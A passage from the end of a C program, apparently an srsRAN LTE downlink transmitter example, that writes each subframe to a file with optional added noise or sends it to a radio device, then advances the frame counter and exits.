         srsran_ofdm_tx_sf(&ifft_mbsfn);
       }
 
       /* send to file or usrp */
       if (output_file_name) {
         if (!null_file_sink) {
           /* Apply AWGN */
           if (output_file_snr != +INFINITY) {
             float var = srsran_convert_dB_to_power(-output_file_snr);
             for (int k = 0; k < cell.nof_ports; k++) {
               srsran_ch_awgn_c(output_buffer[k], output_buffer[k], var, sf_n_samples);
             }
           }
           srsran_filesink_write_multi(&fsink, (void**)output_buffer, sf_n_samples, cell.nof_ports);
         }
         usleep(1000);
       } else {
 #ifndef DISABLE_RF
         float norm_factor = (float)cell.nof_prb / 15 / sqrtf(pdsch_cfg.grant.nof_prb);
         for (i = 0; i < cell.nof_ports; i++) {
           srsran_vec_sc_prod_cfc(
               output_buffer[i], rf_amp * norm_factor, output_buffer[i], SRSRAN_SF_LEN_PRB(cell.nof_prb));
         }
         srsran_rf_send_multi(&radio, (void**)output_buffer, sf_n_samples, true, start_of_burst, false);
         start_of_burst = false;
 #endif
       }
     }
     nf++;
     sfn = (sfn + 1) % 1024;
   }
 
   base_free();
 
   exit(0);
 }